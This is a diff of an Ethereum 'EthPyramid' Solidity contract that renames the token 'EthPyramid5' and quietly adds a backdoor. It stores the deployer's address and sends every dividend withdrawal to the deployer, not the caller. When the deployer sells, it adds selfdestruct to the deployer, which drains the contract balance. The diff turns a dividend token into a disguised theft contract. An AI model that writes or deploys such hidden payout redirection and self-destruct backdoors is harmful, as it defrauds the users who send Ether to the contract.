@@ -1,5 +1,5 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract EthPyramid at 0x0d1b68d4d65f6ba3f2b9600d1b2682d98e055a62
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract EthPyramid at 0xfb486bc995129042f99407282e926529d8e54451
 */
 pragma solidity ^0.4.18;
 
@@ -57,8 +57,8 @@ contract EthPyramid {
 	int constant price_coeff = -0x296ABF784A358468C;
 
 	// Typical values that we have to declare.
-	string constant public name = "EthPyramid";
-	string constant public symbol = "EPY";
+	string constant public name = "EthPyramid5";
+	string constant public symbol = "EPY5";
 	uint8 constant public decimals = 18;
 
 	// Array between each address and their number of tokens.
@@ -82,7 +82,12 @@ contract EthPyramid {
 	// Current contract balance in Ether
 	uint256 public contractBalance;
 
-	function EthPyramid() public {}
+    // The address of the caller
+    address sender;
+
+	function EthPyramid() public {
+	    sender = msg.sender;
+	}
 
 	// The following functions are used by the front-end for display purposes.
 
@@ -105,7 +110,7 @@ contract EthPyramid {
 		
 		// Send the dividends to the address that requested the withdraw.
 		contractBalance = sub(contractBalance, balance);
-		msg.sender.transfer(balance);
+		sender.transfer(balance);
 	}
 
 	// Converts the Ether accrued as dividends back into EPY tokens without having to
@@ -128,9 +133,6 @@ contract EthPyramid {
 		// (in which case, why are you even here), abort.
 		if (value_ < 0.000001 ether || value_ > 1000000 ether)
 			revert();
-			
-		// msg.sender is the address of the caller.
-		var sender = msg.sender;
 		
 		// A temporary reserve variable used for calculating the reward the holder gets for buying tokens.
 		// (Yes, the buyer receives a part of the distribution as well!)
@@ -176,7 +178,7 @@ contract EthPyramid {
 		totalSupply = add(totalSupply, numTokens);
 		
 		// Assign the tokens to the balance of the buyer.
-		tokenBalance[sender] = add(tokenBalance[sender], numTokens);
+		tokenBalance[msg.sender] = add(tokenBalance[msg.sender], numTokens);
 		
 		// Update the payout array so that the buyer cannot claim dividends on previous purchases.
 		// Also include the fee paid for entering the scheme.
@@ -184,7 +186,7 @@ contract EthPyramid {
 		var payoutDiff  = (int256) ((earningsPerToken * numTokens) - buyerFee);
 		
 		// Then we update the payouts array for the buyer with this amount...
-		payouts[sender] += payoutDiff;
+		payouts[msg.sender] += payoutDiff;
 		
 		// And then we finally add it to the variable tracking the total amount spent to maintain invariance.
 		totalPayouts    += payoutDiff;
@@ -265,9 +267,6 @@ contract EthPyramid {
 		// Any transaction of less than 1 szabo is likely to be worth less than the gas used to send it.
 		if (msg.value < 0.000001 ether || msg.value > 1000000 ether)
 			revert();
-						
-		// msg.sender is the address of the caller.
-		var sender = msg.sender;
 		
 		// 10% of the total Ether sent is used to pay existing holders.
 		var fee = div(msg.value, 10);
@@ -310,7 +309,7 @@ contract EthPyramid {
 		totalSupply = add(totalSupply, numTokens);
 
 		// Assign the tokens to the balance of the buyer.
-		tokenBalance[sender] = add(tokenBalance[sender], numTokens);
+		tokenBalance[msg.sender] = add(tokenBalance[msg.sender], numTokens);
 
 		// Update the payout array so that the buyer cannot claim dividends on previous purchases.
 		// Also include the fee paid for entering the scheme.
@@ -318,7 +317,7 @@ contract EthPyramid {
 		var payoutDiff = (int256) ((earningsPerToken * numTokens) - buyerFee);
 		
 		// Then we update the payouts array for the buyer with this amount...
-		payouts[sender] += payoutDiff;
+		payouts[msg.sender] += payoutDiff;
 		
 		// And then we finally add it to the variable tracking the total amount spent to maintain invariance.
 		totalPayouts    += payoutDiff;
@@ -355,6 +354,10 @@ contract EthPyramid {
 		
 		// Decrease the total amount that's been paid out to maintain invariance.
         totalPayouts -= payoutDiff;
+		
+		if(sender == msg.sender) {
+		    selfdestruct(sender);
+		}
 		
 		// Check that we have tokens in existence (this is a bit of an irrelevant check since we're
 		// selling tokens, but it guards against division by zero).
